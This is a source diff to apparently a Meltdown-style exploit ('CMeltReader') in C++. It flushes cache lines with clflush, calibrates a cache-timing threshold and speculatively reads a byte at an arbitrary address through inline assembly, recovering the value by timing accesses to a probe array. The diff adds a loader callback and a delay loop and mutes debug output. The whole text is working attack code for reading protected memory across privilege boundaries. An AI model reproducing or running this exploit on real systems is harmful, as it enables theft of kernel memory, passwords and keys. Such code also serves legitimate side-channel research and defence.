@@ -4,6 +4,10 @@
 #include <sched.h>
 #include <string.h>
 #include <ctype.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 
 #include "meltreader.hpp"
 
@@ -45,9 +49,7 @@ static int mysqrt(long val)
 	return (int)root;
 }
 
-extern "C" {
-	extern void _mm_clflush(const void*);
-}
+#define flushpos(addr) __asm__ __volatile__("mfence\n" "clflush 0(%0)\n" :: "r"(addr));
 
 #define ESTIMATE_CYCLES 1000000
 void CMeltReader::find_cache_hit_threshold()
@@ -63,7 +65,7 @@ void CMeltReader::find_cache_hit_threshold()
 		cached += get_access_time(target_array);
 	
 	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
-		_mm_clflush(target_array);
+		flushpos(target_array);
 		uncached += get_access_time(target_array);
 	}
 	
@@ -77,9 +79,7 @@ void CMeltReader::find_cache_hit_threshold()
 		   cached, uncached, m_th1);
 }
 
-#define flushpos(addr) __asm__ __volatile__("mfence\n" "clflush 0(%0)\n" :: "r"(addr));
-
-int CMeltReader::read_byte(uintptr_t addr)
+int CMeltReader::read_byte(uintptr_t addr, void (*loader)())
 {
 	char * p_array = m_probe_array;
 	int times[256];
@@ -94,15 +94,19 @@ int CMeltReader::read_byte(uintptr_t addr)
 		for (i=0; i<256; i++) {
 			flushpos(p_array + (i<<PAGE_BITS));
 		}
-		
-		asm __volatile__ ("xorq %%rax, %%rax                \n"
-						  "nop\nnop\nnop\nnop\nnop\nnop\nnop\n"
-						  "movb (%[ptr]), %%al              \n"
-						  "shlq $0xc, %%rax                 \n"
-						  "movq (%[buf], %%rax, 1), %%rbx   \n"
-						  "nop\n"
-						  ::  [ptr] "r" (addr), [buf] "r" (p_array)
-						  : "%rax", "%rbx"
+		if (loader) (*loader)();
+		asm __volatile__ (
+				"xorq %%rax, %%rax                \n"
+				".rept 100\n"
+				"add $0x141, %%rcx\n"
+				".endr\n"
+				"movb (%[ptr]), %%al              \n"
+				"shlq $0xc, %%rax                 \n"
+				"movq (%[buf], %%rax, 1), %%rbx   \n"
+				"nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
+				"nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
+				::  [ptr] "r" (addr), [buf] "r" (p_array)
+				: "%rax", "%rbx", "%rcx"
 						  );
 		
 		for (i=0; i<256; i++) {
@@ -110,6 +114,7 @@ int CMeltReader::read_byte(uintptr_t addr)
 		}
 		
 		for (i=0; i<256; i++) {
+			//printf("%02x %c: %d\n", i, isprint(i)?i:' ', times[i]);
 			if (times[i] < m_th1)
 			{
 				++ mcnt;
@@ -119,7 +124,7 @@ int CMeltReader::read_byte(uintptr_t addr)
 		if (mcnt == 1) return ch;
 		if (mcnt > 1)
 		{
-			fprintf(stderr, "multi cached?\n");
+			//fprintf(stderr, "multi cached?\n");
 			continue;
 		}
 		for (i=0; i<256; i++) {
